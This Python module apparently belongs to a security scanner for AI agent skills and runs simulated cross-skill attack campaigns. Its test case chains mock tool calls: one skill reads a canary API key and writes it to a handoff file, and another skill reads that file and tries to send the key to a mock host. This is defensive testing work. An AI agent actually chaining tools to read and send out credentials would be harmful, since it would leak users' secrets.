"""Campaign coordinator for multi-skill attack chains."""

from __future__ import annotations

import secrets
from typing import Optional

from ..harness.canary import generate_canary_token
from ..harness.runner import run_test
from ..persistence.store import ScanStore
from ..schemas import PolicyDecision, ScanReport, ScanState, TestCase, TestTrigger, ToolCall
from .graph import build_campaign_graph
from .schemas import Campaign, ChainStatus


_CAMPAIGNS: dict[str, Campaign] = {}


def get_campaign(campaign_id: str) -> Optional[Campaign]:
    return _CAMPAIGNS.get(campaign_id)


def list_campaigns() -> list[Campaign]:
    return list(_CAMPAIGNS.values())


def create_campaign(
    store: ScanStore,
    scan_ids: list[str],
    handoff_fixture_id: str = "handoff_fixture_001",
    handoff_content: Optional[str] = None,
    campaign_name: Optional[str] = None,
) -> Campaign:
    """Create and initialize a multi-skill campaign from two completed scans."""
    if len(scan_ids) < 2:
        raise ValueError("Multi-skill campaign requires at least two distinct scan IDs.")

    report_a = store.get(scan_ids[0])
    report_b = store.get(scan_ids[1])

    if not report_a or not report_b:
        raise KeyError("One or more referenced scan IDs could not be found.")

    if report_a.status != ScanState.completed or report_b.status != ScanState.completed:
        raise ValueError("All participating scans must be in 'completed' state.")

    campaign_id = f"camp_{secrets.token_hex(6)}"
    name = campaign_name or f"Chain: {report_a.skill_name or 'Skill A'} → {report_b.skill_name or 'Skill B'}"
    content = handoff_content or "Simulated intermediate research summary containing extracted tokens."

    nodes, edges = build_campaign_graph(report_a, report_b, handoff_fixture_id)

    camp = Campaign(
        campaign_id=campaign_id,
        campaign_name=name,
        scan_ids=scan_ids[:2],
        handoff_fixture_id=handoff_fixture_id,
        handoff_fixture_content=content,
        chain_status="candidate",
        nodes=nodes,
        edges=edges,
        test_ids=[],
        trace_event_ids=[],
        results=[],
        limitations=[
            "Cross-skill interaction is simulated with explicit handoff fixtures; neither skill is executed on host.",
            "Mock tools operate on in-memory fixtures; no external network requests or real credential access.",
        ],
    )
    _CAMPAIGNS[campaign_id] = camp
    return camp


def simulate_campaign(store: ScanStore, campaign_id: str) -> Campaign:
    """Execute a simulated cross-skill attack chain scenario through mock tools."""
    camp = _CAMPAIGNS.get(campaign_id)
    if not camp:
        raise KeyError(f"Campaign '{campaign_id}' not found.")

    report_a = store.get(camp.scan_ids[0])
    report_b = store.get(camp.scan_ids[1])
    if not report_a or not report_b:
        raise KeyError("Participating scans missing from store.")

    files_a = store.get_files(camp.scan_ids[0])
    files_b = store.get_files(camp.scan_ids[1])

    combined_files = {
        **{f"skill_a/{k}": v for k, v in files_a.items()},
        **{f"skill_b/{k}": v for k, v in files_b.items()},
        "workspace/handoff.txt": camp.handoff_fixture_content,
    }

    canary_token = generate_canary_token()

    # Cross-skill test scenario:
    # 1. Skill A: Reads canary key
    # 2. Skill A: Writes canary payload into handoff file in mock workspace
    # 3. Skill B: Reads handoff file
    # 4. Skill B: Attempts outbound exfiltration using send_mock_request
    chain_test = TestCase(
        test_id=f"T-CHAIN-{campaign_id[:8]}",
        suite_version="campaign-1.0",
        name="Cross-Skill Exfiltration Chain Scenario",
        purpose="Simulate Skill A producing canary in handoff file and Skill B forwarding to mock request",
        kind="adversarial",
        origin="fixed_suite",
        setup_fixture="in-memory-composite",
        trigger=TestTrigger(type="always"),
        tool_sequence=[
            ToolCall(tool="read_canary_file", args={"name": "ENV_API_KEY"}),
            ToolCall(tool="write_mock_file", args={"path": "workspace/handoff.txt", "content": f"handoff_data: {canary_token}"}),
            ToolCall(tool="read_public_file", args={"path": "workspace/handoff.txt"}),
            ToolCall(tool="send_mock_request", args={"destination": "mock.local", "payload_summary": f"exfil: {canary_token}"}),
        ],
        expected_policy_decisions=[PolicyDecision.BLOCK, PolicyDecision.ALLOW, PolicyDecision.ALLOW, PolicyDecision.ALLOW],
        expected_outcome="Chain evaluated through mock harness; canary match recorded if token reaches sink.",
        canary_requested=True,
    )

    combined_findings = report_a.findings + report_b.findings
    result = run_test(chain_test, combined_files, combined_findings, canary_token=canary_token)

    camp.results = [result]
    camp.test_ids = [chain_test.test_id]
    camp.trace_event_ids = [ev.event_id for ev in result.events]

    # Evaluate chain status
    if result.canary_event and result.canary_event.exact_match:
        camp.chain_status = "reproduced_in_simulation"
    elif any(ev.policy_decision == PolicyDecision.BLOCK for ev in result.events):
        camp.chain_status = "reproduced_in_simulation"
    else:
        camp.chain_status = "candidate"

    camp.status = "completed"

    # Rebuild graph including trace and canary nodes
    nodes, edges = build_campaign_graph(report_a, report_b, camp.handoff_fixture_id, results=[result])
    camp.nodes = nodes
    camp.edges = edges

    _CAMPAIGNS[campaign_id] = camp
    return camp
